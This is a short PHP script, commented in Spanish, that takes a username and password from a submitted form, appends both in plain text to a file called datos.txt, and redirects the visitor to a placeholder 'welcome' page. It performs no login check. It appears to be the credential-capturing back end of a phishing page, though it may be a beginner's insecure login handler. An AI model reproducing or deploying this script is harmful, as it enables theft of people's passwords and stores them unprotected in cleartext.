<?php
// Obtener los datos enviados
$usuario = $_POST['usuario'];
$password = $_POST['password'];

// Guardar en un archivo de texto
$archivo = fopen("datos.txt", "a");
fwrite($archivo, "Usuario: $usuario | Contraseña: $password" . PHP_EOL);
fclose($archivo);

// Redirigir a otra página después del login
header("Location: https://tusitio.com/bienvenido.html");
exit();
?>
